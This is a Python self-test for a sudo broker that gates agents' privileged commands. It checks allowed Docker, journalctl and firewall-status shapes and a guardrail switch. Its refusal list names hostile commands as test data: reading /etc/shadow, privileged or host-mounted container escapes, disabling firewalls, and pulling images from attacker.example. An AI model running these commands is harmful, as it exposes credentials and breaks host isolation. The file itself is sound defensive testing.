#!/usr/bin/python3 -I
"""Offline policy test for broker.py: python3 -I selftest.py [path/to/broker.py]. Exit 0 = every case as expected."""
import importlib.util, shlex, sys, os

path = sys.argv[1] if len(sys.argv) > 1 else os.path.join(os.path.dirname(os.path.abspath(__file__)), 'broker.py')
spec = importlib.util.spec_from_file_location('broker', path)
b = importlib.util.module_from_spec(spec); spec.loader.exec_module(b)
P = b.PROJECT
# run from the source tree, the broker finds the project three folders up and its owner by stat
assert os.path.isdir(os.path.join(P, 'company', 'tools', 'sudo-gate')), P
ID = 'app-integration-f57759a3-e116-46e6-a4e1-ab3e6eb98d15'

ALLOW = [  # the shapes agents run through sudo (integration databases, audits, probes), plus the company scripts
    'true', 'id -nG', 'id someone',
    f'docker --host unix:///var/run/docker.sock exec {ID} pg_isready -h 127.0.0.1 -U integration -d integration',
    f'docker --host unix:///var/run/docker.sock rm --force --volumes {ID}',
    "docker ps --format '{{.Names}} {{.Image}} {{.Status}}'",
    f'docker --host unix:///var/run/docker.sock port {ID} 5432/tcp',
    f'docker --host unix:///var/run/docker.sock create --name {ID} --publish 127.0.0.1::5432 --env POSTGRES_USER=integration --env POSTGRES_PASSWORD=x --env POSTGRES_DB=integration postgres:16-alpine',
    f'docker --host unix:///var/run/docker.sock start {ID}',
    "docker version --format '{{.Server.Version}} / api {{.Server.APIVersion}}'",
    'docker image inspect postgres:16-alpine',
    # the pull verb, allowlisted with the same image rule that binds run/create
    'docker pull postgres:18-alpine', 'docker pull library/alpine', 'docker pull alpine:3.20',
    f"docker pull postgres@sha256:{'a' * 64}",
    'docker context inspect --format {{.Endpoints.docker.Host}}',
    "docker images --format '{{.Repository}}:{{.Tag}} {{.Size}}'", 'docker images',
    'docker run -d --rm --name audit-tenant-probe -e POSTGRES_PASSWORD=x -e POSTGRES_USER=probe -e POSTGRES_DB=p -p 127.0.0.1:55442:5432 postgres:16-alpine',
    'docker run --rm --label audit-test=1 postgres:16-alpine postgres --version',
    'docker run -d --name drill-dst-1 -e POSTGRES_USER=postgres -e POSTGRES_PASSWORD=x -e POSTGRES_DB=app postgres:16-alpine',
    'docker volume ls -q', 'docker network ls --format {{.Name}}',
    # read-only metadata, for attributing anonymous volumes
    'docker volume inspect 8a9dd0919863aeed48e759902cce79e11cd8ee68dde343acd2b9302c78772c9d',
    "docker volume inspect --format '{{.Name}} {{.Labels}}' 8a9dd0919863aeed48e759902cce79e11cd8ee68dde343acd2b9302c78772c9d",
    "docker inspect -f '{{range .Mounts}}{{.Type}}{{end}}' drill-dst-2906875",
    "docker inspect qa-e11-roster --format '{{json .Config.Env}}'",
    'docker ps -a --filter name=app-integration- --format {{.Names}}', 'docker ps -a', 'docker ps',
    'docker exec -i qa-e11-roster psql -v ON_ERROR_STOP=1 -U qa -d qa -q',
    "docker exec qa-probe psql -U qa -d qa -At -c 'select 1'",
    'docker stop qa-535', "docker info --format '{{.ServerVersion}}'", 'docker logs --tail 50 qa-535',
    'docker run --rm -v pgdata:/var/lib/postgresql/data postgres:16-alpine true',
    'docker run --rm -v pgdata:/var/lib/postgresql/data:ro postgres:16-alpine true',
    'docker run --rm --volume=pgdata:/d:rw,nocopy postgres:16-alpine true', 'docker run --rm --tmpfs /w postgres:16-alpine true',
    'ufw status', 'ufw status numbered', 'ufw status verbose', 'ss -tlnp', 'ss -tulpn',
    "journalctl -u docker.service --since '2025-01-01 00:00' --no-pager",
    "journalctl --no-pager -S 'today 13:00' -U 'today 13:10'", 'journalctl -k --no-pager', 'journalctl --no-pager --disk-usage',
    'journalctl --no-pager -g docker -n 3', 'journalctl --no-pager --list-boots', "journalctl --since '-3 min' --no-pager",
    "journalctl -t sudo -t sudo-i --since '2025-01-01 20:00:00' --until '2025-01-01 20:08:00' --no-pager",
    "journalctl --since '24 hours ago' -g COMMAND= --no-pager", 'journalctl _COMM=sudo -o json -b', 'journalctl /usr/bin/sudo -n 5',
    'snapper list-configs', 'snapper -c root list', 'btrfs subvolume list /', 'btrfs subvolume show /', 'cryptsetup status root',
    'nft list ruleset', 'iptables -S', 'iptables -L -n -v', 'ip6tables -S', 'sshd -T',
    '/usr/bin/docker ps', '/usr/sbin/ufw status',
]
ALLOW_NOBODY = ['true', 'curl -s --max-time 5 http://127.0.0.1:9/', 'id']
REFUSE = [
    'cat /etc/shadow', 'grep -h x /var/log/auth.log', 'ls -la /etc/sudoers.d', 'tr \\0 \\n', 'curl -s http://x/',
    'sh -c id', 'bash', 'su', 'env X=1 docker ps', '/tmp/docker ps', './docker ps', 'python3 -c 1', 'tee /etc/x',
    'docker run --privileged postgres:16-alpine', 'docker run --cap-add SYS_ADMIN postgres:16-alpine',
    'docker run --cap-add=ALL postgres:16-alpine', 'docker run --device /dev/sda postgres:16-alpine',
    'docker run --pid=host postgres:16-alpine', 'docker run --pid host postgres:16-alpine', 'docker run --ipc=host postgres:16-alpine',
    'docker run --userns=host postgres:16-alpine', 'docker run --network=host postgres:16-alpine', 'docker run --net host postgres:16-alpine',
    'docker run --security-opt seccomp=unconfined postgres:16-alpine', 'docker run --name a --privileged postgres:16-alpine',
    'docker run -v /:/host postgres:16-alpine', 'docker run -v /etc:/e postgres:16-alpine', 'docker run -v /root:/r postgres:16-alpine',
    'docker run -v /home/someone:/h postgres:16-alpine', f'docker run -v {P}/../..:/h postgres:16-alpine',
    f'docker run -v {P}/secrets/station-token:/t postgres:16-alpine', f'docker run -v {P}/.starnet-data:/d postgres:16-alpine',
    'docker run -v /var/run/docker.sock:/s postgres:16-alpine', 'docker run --volume=/:/h postgres:16-alpine',
    'docker run --mount type=bind,source=/,target=/h postgres:16-alpine', 'docker run --env-file /etc/shadow postgres:16-alpine',
    'docker run --volumes-from x postgres:16-alpine', 'docker run --cidfile /etc/x postgres:16-alpine',
    'docker run -p 5432:5432 postgres:16-alpine', 'docker run -p 0.0.0.0:5432:5432 postgres:16-alpine', 'docker run -P postgres:16-alpine',
    'docker run --rm --unknown-flag x postgres:16-alpine', 'docker run --log-driver syslog postgres:16-alpine',
    'docker create --privileged postgres:16-alpine', 'docker exec --privileged c sh', 'docker exec --privileged=true c sh',
    'docker exec c', 'docker cp c:/x /etc/x', 'docker build .', 'docker compose up', 'docker volume create --opt device=/ v',
    # the boundary of the read-only widening: inspect needs a subject, and `system df` stays outside the gate
    'docker volume inspect', 'docker volume inspect --format x', 'docker system df', 'docker system df -v',
    'docker volume prune -f', 'docker volume rm v',
    'docker network create n', 'docker save -o /etc/x img', 'docker load -i x', 'docker commit c i',
    'docker --config /home/someone/x ps', 'docker --host tcp://1.2.3.4:2375 ps', 'docker -H tcp://x ps', 'docker --context x ps',
    'docker logs -f c', 'docker system prune -af', 'docker context create x', 'docker image rm x', 'docker plugin install x', 'docker',
    'ufw disable', 'ufw allow 22', 'ufw status; id', 'ss -K dst 1.2.3.4', 'ss -tlnp extra',
    'journalctl -f', 'journalctl --vacuum-size=1M', 'journalctl --rotate', 'journalctl -D /home/someone/x', 'journalctl --file /etc/shadow',
    'journalctl --cursor-file /etc/x', 'journalctl --root /x', 'journalctl /etc/shadow', 'journalctl --setup-keys', 'journalctl --flush',
    'snapper create', 'snapper -c root delete 1', 'snapper rollback', 'btrfs subvolume delete /x', 'btrfs subvolume snapshot / /x',
    'btrfs filesystem show', 'cryptsetup luksDump /dev/sda2', 'cryptsetup open x', 'nft flush ruleset', 'nft -f /tmp/x',
    'nft add rule inet x y accept', 'iptables -F', 'iptables -A INPUT -j ACCEPT', 'iptables -P INPUT ACCEPT', 'iptables -t nat -F',
    'sshd', 'sshd -D', 'sshd -T -f /etc/shadow', 'true x', 'id -nG a b',
    # host binds are refused everywhere, project and /tmp included
    f'docker run --rm -v {P}/company/repos/app:/src:ro postgres:16-alpine ls /src',
    'docker run --rm -v /tmp/master-gate:/w postgres:16-alpine true', 'docker run --rm -v /tmp:/t:ro postgres:16-alpine true',
    'docker run -u 0 -v /tmp:/t postgres:16-alpine true', f'docker run -u 0 -v {P}:/w postgres:16-alpine true',
    f'docker run -v {P}/company:/w:ro postgres:16-alpine true', f'docker create -v {P}/company:/w postgres:16-alpine',
    'docker run -v ./x:/w postgres:16-alpine true', 'docker run -v ~/x:/w postgres:16-alpine true',
    'docker run -v pgdata:/d:rshared postgres:16-alpine true', 'docker run -v pgdata:/d:ro,z postgres:16-alpine true',
    'docker run -v pgdata:d postgres:16-alpine true', 'docker run -v pg/data:/d postgres:16-alpine true',
    'docker run -v a:/b:ro:x postgres:16-alpine true',
    # image references: the capability that `run` already conferred, now bounded on
    # both verbs. A registry host in the reference is the supply-chain decision and is refused.
    'docker pull ghcr.io/evil/thing:1', 'docker pull docker.io/library/postgres:18-alpine',
    'docker pull postgres:18-alpine --platform linux/amd64', 'docker pull postgres:18-alpine extra',
    'docker pull index.docker.io/postgres', 'docker pull attacker.example/postgres:18',
    'docker run --rm ghcr.io/evil/thing:1 true', 'docker create quay.io/x/y:1',
]
REFUSE_USERS = [('someone', 'docker ps'), ('someone', 'id -nG'), ('postgres', 'true'), ('nobody', 'cat /etc/passwd'),
                ('nobody', 'docker ps'), ('nobody', 'sh -c id')]

fails = 0
def expect(argv, user, ok):
    global fails
    try:
        b.decide(argv, user); got = True; why = ''
    except b.Refuse as e:
        got = False; why = str(e)
    if got != ok:
        fails += 1
        print('FAIL %s as %s: expected %s, got %s %s' % (shlex.join(argv), user, 'allow' if ok else 'refuse', 'allow' if got else 'refuse', why))

for c in ALLOW: expect(shlex.split(c), 'root', True)
for c in ALLOW_NOBODY: expect(shlex.split(c), 'nobody', True)
for c in REFUSE: expect(shlex.split(c), 'root', False)
for u, c in REFUSE_USERS: expect(shlex.split(c), u, False)
expect([], 'root', False); expect(['docker', 'ps\0'], 'root', False)
# journalctl always gets --no-pager, whatever the caller passed
assert b.decide(['journalctl', '-n', '1'], 'root')[:2] == ['/usr/bin/journalctl', '--no-pager']
assert b.redact('docker run -e POSTGRES_PASSWORD=abc -e X=1') == 'docker run -e POSTGRES_PASSWORD=<redacted> -e X=1'
# exec/start targets and the host-power check on an existing container (pure halves of guard_targets)
assert b.docker_targets(b.decide(shlex.split('docker exec -i -u postgres qa psql -q'), 'root')) == ['qa']
assert b.docker_targets(b.decide(shlex.split('docker --host unix:///var/run/docker.sock start a b'), 'root')) == ['a', 'b']
assert b.docker_targets(b.decide(shlex.split('docker ps -a'), 'root')) == []
HARMLESS = {'HostConfig': {'Privileged': False, 'CapAdd': None, 'Devices': [], 'SecurityOpt': None, 'PidMode': '',
                           'IpcMode': 'private', 'NetworkMode': 'bridge', 'CgroupnsMode': 'private', 'Binds': None},
            'Mounts': [{'Type': 'volume', 'Source': '/var/lib/docker/volumes/x/_data'}]}
assert b.host_power(HARMLESS) is None
POWER = [{'Privileged': True}, {'CapAdd': ['SYS_ADMIN']}, {'Devices': [{'PathOnHost': '/dev/sda'}]}, {'PidMode': 'host'},
         {'IpcMode': 'host'}, {'UTSMode': 'host'}, {'UsernsMode': 'host'}, {'NetworkMode': 'host'},
         {'SecurityOpt': ['seccomp=unconfined']}, {'Binds': ['/:/host']}, {'VolumesFrom': ['x']}, {'CgroupnsMode': 'host'}]
for hc in POWER:
    assert b.host_power({'HostConfig': hc, 'Mounts': []}), hc
assert b.host_power({'HostConfig': {}, 'Mounts': [{'Type': 'bind', 'Source': '/etc'}]})
# guardrail privilegedShell: ON = the allowlist above; OFF = pass-through (still refuses malformed requests). OFF needs the
# project's guardrails.json AND the installed root-owned gate.json; any read error keeps it ON.
import json, tempfile
gcases = 0
def gexpect(cond, what):
    global fails, gcases
    gcases += 1
    if not cond:
        fails += 1
        print('FAIL guardrail: %s' % what)
def plan_ok(argv, user, guarded):
    try:
        return b.plan(argv, user, guarded)
    except b.Refuse:
        return None
gexpect(plan_ok(['cat', '/etc/shadow'], 'root', True) is None, 'ON: cat /etc/shadow refused')
r = plan_ok(['cat', '/etc/shadow'], 'root', False)
gexpect(r is not None and r[0].endswith('/cat') and r[1:] == ['/etc/shadow'], 'OFF: cat /etc/shadow passes through (%r)' % (r,))
gexpect(plan_ok(['/usr/bin/env', 'X=1', 'id'], 'root', False) == ['/usr/bin/env', 'X=1', 'id'], 'OFF: an absolute path passes as given')
gexpect(plan_ok(['docker', 'run', '--privileged', 'postgres:16-alpine'], 'root', False) is not None or not os.path.exists('/usr/bin/docker'), 'OFF: docker --privileged passes')
gexpect(plan_ok(['./x'], 'root', False) is None, 'OFF: a relative path is refused')
gexpect(plan_ok(['id'], 'someone', False) is None, 'OFF: users other than root/nobody are refused')
gexpect(plan_ok([], 'root', False) is None and plan_ok(['id\0'], 'root', False) is None, 'OFF: malformed requests are refused')
gexpect(plan_ok(['no-such-binary-xyz'], 'root', False) is None, 'OFF: an unknown command name is refused')
with tempfile.TemporaryDirectory() as T:
    os.makedirs(os.path.join(T, 'company', 'state'))
    GF, GJ, NOGJ = os.path.join(T, 'company', 'state', 'guardrails.json'), os.path.join(T, 'gate.json'), os.path.join(T, 'absent.json')
    def put(f, obj):
        with open(f, 'w') as fh:
            fh.write(obj if isinstance(obj, str) else json.dumps(obj))
    g = lambda gj, euid=1000: b.guard_privileged_shell(gate_json=gj, project=T, euid=euid)
    gexpect(g(NOGJ) is True, 'no guardrails.json: ON')
    put(GF, '{ broken'); gexpect(g(NOGJ) is True, 'unreadable guardrails.json: ON')
    put(GF, {'guards': {'privilegedShell': True}}); put(GJ, {'privilegedShell': False}); gexpect(g(GJ) is True, 'project ON wins over gate.json OFF')
    put(GF, {'guards': {'privilegedShell': False}})
    gexpect(g(NOGJ) is False, 'source tree, unprivileged, project OFF: OFF')
    gexpect(g(NOGJ, euid=0) is True, 'no gate.json and running as root: ON (an agent-writable file alone never opens root)')
    put(GJ, {'project': T, 'uid': 1, 'gid': 1}); gexpect(g(GJ) is True, 'installed, gate.json has no switch: ON')
    put(GJ, {'privilegedShell': False}); gexpect(g(GJ) is False and g(GJ, euid=0) is False, 'installed, both OFF: OFF')
    put(GJ, '[1'); gexpect(g(GJ) is True, 'gate.json unreadable: ON')

n = len(ALLOW) + len(ALLOW_NOBODY) + len(REFUSE) + len(REFUSE_USERS) + 2 + gcases
print('%s: %d/%d policy cases as expected (%d allowed shapes, %d refused)' % ('PASS' if not fails else 'FAIL', n - fails, n,
      len(ALLOW) + len(ALLOW_NOBODY), len(REFUSE) + len(REFUSE_USERS) + 2))
sys.exit(1 if fails else 0)
